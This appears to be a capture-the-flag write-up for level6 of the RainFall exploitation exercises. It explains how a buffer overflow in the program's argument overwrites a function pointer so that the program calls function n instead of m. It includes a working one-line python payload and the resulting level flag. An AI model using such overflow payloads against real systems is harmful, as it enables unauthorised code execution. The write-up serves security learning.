### Exploit

This level is ever so slightly different, as instead of expecting the user to write on the standard input, the program 
segfaults unless we pass an argument to the `main` function.

```
    level6@RainFall:~$ ./level6
    Segmentation fault (core dumped)
    level6@RainFall:~$ ./level6 test
    Nope
```
This program is very much like this of level1: function `n` makes a syscall, but the function itself is never called within the program. But `m` (0x8048468) is.

```
    0x080484a5 <+41>:	mov    edx,0x8048468
    [...]
    0x080484b8 <+60>:	mov    edx,eax
    [...]
    0x080484d0 <+84>:	call   eax
```

Once again, simply push the address to function `n` on top of the stack so it executes `n` instead of `m`. 

```
    level6@RainFall:~$ ./level6 $(python -c 'print "a"*72 + "\x54\x84\x04\x08"')
    f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
```

That wasn't too bad, was it?
